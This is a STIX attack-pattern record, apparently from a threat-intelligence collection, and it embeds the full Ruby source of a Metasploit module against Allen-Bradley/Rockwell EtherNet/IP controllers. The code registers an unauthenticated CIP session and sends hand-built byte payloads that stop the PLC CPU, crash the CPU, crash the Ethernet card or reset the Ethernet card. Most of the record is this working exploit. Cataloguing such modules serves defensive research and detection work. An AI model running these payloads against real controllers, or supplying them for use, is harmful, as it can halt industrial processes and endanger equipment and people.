{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd2b4eb0-6b17-46db-9616-79baba94e174",
    "created": "2024-08-14T16:22:23.769583Z",
    "modified": "2024-08-14T16:22:23.769587Z",
    "name": "Allen-Bradley/Rockwell Automation EtherNet/IP CIP Commands",
    "description": " The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which implements the protocol.  This module implements the CPU STOP command, as well as the ability to crash the Ethernet card in an affected device.  This module is based on the original 'ethernetip-multi.rb' Basecamp module from DigitalBond. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/multi_cip_command.rb",
            "external_id": "multi_cip_command.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.digitalbond.com/tools/basecamp/metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Rex::Socket::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Commands',\n      'Description'    => %q{\n        The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which\n        implements the protocol.  This module implements the CPU STOP command, as well as\n        the ability to crash the Ethernet card in an affected device.\n\n        This module is based on the original 'ethernetip-multi.rb' Basecamp module\n        from DigitalBond.\n      },\n      'Author'         =>\n        [\n          'Ruben Santamarta <ruben[at]reversemode.com>',\n          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module\n          'todb' # Metasploit fixups\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]\n        ],\n      'DisclosureDate' => '2012-01-19'))\n\n    register_options(\n      [\n        Opt::RPORT(44818),\n        # Note that OptEnum is case sensitive\n        OptEnum.new(\"ATTACK\", [true, \"The attack to use.\", \"STOPCPU\",\n          [\n            \"STOPCPU\",\n            \"CRASHCPU\",\n            \"CRASHETHER\",\n            \"RESETETHER\"\n          ]\n        ])\n      ], self.class\n    )\n  end\n\n  def run\n    attack = datastore[\"ATTACK\"]\n    print_status \"#{rhost}:#{rport} - CIP - Running #{attack} attack.\"\n    sid = req_session\n    if sid\n      forge_packet(sid, payload(attack))\n      print_status \"#{rhost}:#{rport} - CIP - #{attack} attack complete.\"\n    end\n  end\n\n  def forge_packet(sessionid, payload)\n    packet = \"\"\n    packet += \"\\x6f\\x00\" # command: Send request/reply data\n    packet += [payload.size - 0x10].pack(\"v\") # encap length (2 bytes)\n    packet += [sessionid].pack(\"N\") # session identifier (4 bytes)\n    packet += payload #payload part\n    begin\n      sock.put(packet)\n    rescue ::Interrupt\n      print_error(\"#{rhost}:#{rport} - CIP - Interrupt during payload\")\n      raise $!\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused\n      print_error(\"#{rhost}:#{rport} - CIP - Network error during payload\")\n      return nil\n    end\n  end\n\n  def req_session\n    begin\n      connect\n      packet = \"\"\n      packet += \"\\x65\\x00\" # ENCAP_CMD_REGISTERSESSION (2 bytes)\n      packet += \"\\x04\\x00\" # encaph_length (2 bytes)\n      packet += \"\\x00\\x00\\x00\\x00\" # session identifier (4 bytes)\n      packet += \"\\x00\\x00\\x00\\x00\" # status code (4 bytes)\n      packet += \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" # context information (8 bytes)\n      packet += \"\\x00\\x00\\x00\\x00\" # options flags (4 bytes)\n      packet += \"\\x01\\x00\" # proto (2 bytes)\n      packet += \"\\x00\\x00\" # flags (2 bytes)\n      sock.put(packet)\n      response = sock.get_once\n      if response\n        session_id = response[4..8].unpack(\"N\")[0] rescue nil# bare minimum of parsing done\n        if session_id\n          print_status(\"#{rhost}:#{rport} - CIP - Got session id: 0x\"+session_id.to_s(16))\n        else\n          print_error(\"#{rhost}:#{rport} - CIP - Got invalid session id, aborting.\")\n          return nil\n        end\n      else\n        raise ::Rex::ConnectionTimeout\n      end\n    rescue ::Interrupt\n      print_error(\"#{rhost}:#{rport} - CIP - Interrupt during session negotation\")\n      raise $!\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused => e\n      print_error(\"#{rhost}:#{rport} - CIP - Network error during session negotiation: #{e}\")\n      return nil\n    end\n    return session_id\n  end\n\n  def cleanup\n    disconnect rescue nil\n  end\n\n  def payload(attack)\n    case attack\n    when \"STOPCPU\"\n      payload =  \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + #encapsulation -[payload.size-0x10]-\n      \"\\x00\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xb2\\x00\\x1a\\x00\" + #packet1\n      \"\\x52\\x02\\x20\\x06\\x24\\x01\\x03\\xf0\\x0c\\x00\\x07\\x02\\x20\\x64\\x24\\x01\" + #packet2\n      \"\\xDE\\xAD\\xBE\\xEF\\xCA\\xFE\\x01\\x00\\x01\\x00\"                           #packet3\n    when \"CRASHCPU\"\n      payload = \"\\x00\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xb2\\x00\\x1a\\x00\" +\n      \"\\x52\\x02\\x20\\x06\\x24\\x01\\x03\\xf0\\x0c\\x00\\x0a\\x02\\x20\\x02\\x24\\x01\" +\n      \"\\xf4\\xf0\\x09\\x09\\x88\\x04\\x01\\x00\\x01\\x00\"\n    when \"CRASHETHER\"\n      payload = \"\\x00\\x00\\x00\\x00\\x20\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\xb2\\x00\\x0c\\x00\" +\n      \"\\x0e\\x03\\x20\\xf5\\x24\\x01\\x10\\x43\\x24\\x01\\x10\\x43\"\n    when \"RESETETHER\"\n      payload = \"\\x00\\x00\\x00\\x00\\x00\\x04\\x02\\x00\\x00\\x00\\x00\\x00\\xb2\\x00\\x08\\x00\" +\n      \"\\x05\\x03\\x20\\x01\\x24\\x01\\x30\\x03\"\n    else\n      print_error(\"#{rhost}:#{rport} - CIP - Invalid attack option.\")\n      return nil\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-19"
}